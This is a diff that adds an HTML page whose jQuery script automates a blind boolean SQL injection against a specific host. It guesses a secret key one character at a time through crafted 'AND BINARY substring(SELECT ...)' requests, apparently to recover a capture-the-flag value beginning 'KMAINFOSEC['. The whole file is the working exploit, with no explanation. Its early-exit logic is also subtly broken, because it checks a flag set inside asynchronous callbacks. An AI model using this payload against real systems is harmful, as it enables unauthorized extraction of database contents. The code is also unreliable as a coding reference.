@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Title</title>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+
+</head>
+<body>
+<div id="root">
+    <input type="button" id="button">
+    <div id="content"></div>
+    <div id="number"></div>
+</div>
+
+<script>
+    let amount = 11; //44
+    let resultString = 'KMAINFOSEC[';
+    const searchable = '0123456789!@#$%^*()ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
+    $('#content').text(resultString);
+    $('#number').text(amount);
+
+
+    $('#button').click(function () {
+
+        for (let i = 0; i < searchable.length; i++) {
+            let letter = searchable[i];
+            let shouldBreak = false;
+
+            $.get(`http://infoseckma.usic.org.ua:1029/?id=1+AND+BINARY+substring%28%28SELECT+%60keys%60+FROM+test_database_database_name.keys+LIMIT+1),1,${ amount + 1 })="${ resultString + letter }"`,
+                function (data, status) {
+                    if (data.includes('exist')) {
+                        amount += 1;
+                        resultString = resultString + letter;
+                        $('#content').text(resultString);
+                        $('#number').text(amount);
+                        shouldBreak = true;
+                    }
+                });
+            if (shouldBreak) break;
+        }
+    })
+</script>
+
+</body>
+</html>
